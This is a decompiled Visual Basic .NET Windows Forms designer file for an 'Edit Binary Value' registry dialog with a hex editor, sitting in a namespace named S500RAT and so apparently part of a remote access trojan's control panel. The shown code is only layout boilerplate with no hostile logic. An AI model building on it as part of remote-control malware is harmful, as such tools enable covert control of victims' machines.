Namespace S500RAT
	' Token: 0x02000029 RID: 41
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormRegValueEditBinary
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000822 RID: 2082 RVA: 0x000434F0 File Offset: 0x000416F0
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000823 RID: 2083 RVA: 0x00043540 File Offset: 0x00041740
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.okButton = New Global.System.Windows.Forms.Button()
			Me.label2 = New Global.System.Windows.Forms.Label()
			Me.valueNameTxtBox = New Global.System.Windows.Forms.TextBox()
			Me.label1 = New Global.System.Windows.Forms.Label()
			Me.hexEditor = New Global.Gry.Helper.HexEditor.HexEditor()
			Me.Button1 = New Global.System.Windows.Forms.Button()
			MyBase.SuspendLayout()
			Me.okButton.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.okButton.DialogResult = Global.System.Windows.Forms.DialogResult.OK
			Me.okButton.Location = New Global.System.Drawing.Point(247, 375)
			Me.okButton.Name = "okButton"
			Me.okButton.Size = New Global.System.Drawing.Size(75, 25)
			Me.okButton.TabIndex = 10
			Me.okButton.Text = "OK"
			Me.okButton.UseVisualStyleBackColor = True
			Me.label2.AutoSize = True
			Me.label2.Location = New Global.System.Drawing.Point(12, 63)
			Me.label2.Name = "label2"
			Me.label2.Size = New Global.System.Drawing.Size(66, 14)
			Me.label2.TabIndex = 12
			Me.label2.Text = "Value data:"
			Me.label2.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.valueNameTxtBox.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.valueNameTxtBox.Location = New Global.System.Drawing.Point(14, 39)
			Me.valueNameTxtBox.Name = "valueNameTxtBox"
			Me.valueNameTxtBox.[ReadOnly] = True
			Me.valueNameTxtBox.Size = New Global.System.Drawing.Size(389, 20)
			Me.valueNameTxtBox.TabIndex = 13
			Me.label1.AutoSize = True
			Me.label1.Location = New Global.System.Drawing.Point(12, 19)
			Me.label1.Name = "label1"
			Me.label1.Size = New Global.System.Drawing.Size(74, 14)
			Me.label1.TabIndex = 14
			Me.label1.Text = "Value name:"
			Me.label1.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.hexEditor.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.hexEditor.BackColor = Global.System.Drawing.Color.White
			Me.hexEditor.BorderColor = Global.System.Drawing.Color.Empty
			Me.hexEditor.Cursor = Global.System.Windows.Forms.Cursors.IBeam
			Me.hexEditor.Location = New Global.System.Drawing.Point(15, 80)
			Me.hexEditor.Name = "hexEditor"
			Me.hexEditor.SelectionBackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.hexEditor.Size = New Global.System.Drawing.Size(388, 280)
			Me.hexEditor.TabIndex = 15
			Me.Button1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Button1.DialogResult = Global.System.Windows.Forms.DialogResult.OK
			Me.Button1.Location = New Global.System.Drawing.Point(328, 375)
			Me.Button1.Name = "Button1"
			Me.Button1.Size = New Global.System.Drawing.Size(75, 25)
			Me.Button1.TabIndex = 16
			Me.Button1.Text = "Cancel"
			Me.Button1.UseVisualStyleBackColor = True
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(7F, 14F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			MyBase.ClientSize = New Global.System.Drawing.Size(424, 413)
			MyBase.Controls.Add(Me.Button1)
			MyBase.Controls.Add(Me.hexEditor)
			MyBase.Controls.Add(Me.okButton)
			MyBase.Controls.Add(Me.label2)
			MyBase.Controls.Add(Me.valueNameTxtBox)
			MyBase.Controls.Add(Me.label1)
			Me.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			MyBase.MaximizeBox = False
			MyBase.MinimizeBox = False
			MyBase.Name = "FormRegValueEditBinary"
			MyBase.ShowIcon = False
			MyBase.ShowInTaskbar = False
			MyBase.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "Edit Binary Value"
			MyBase.TopMost = True
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x0400039B RID: 923
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
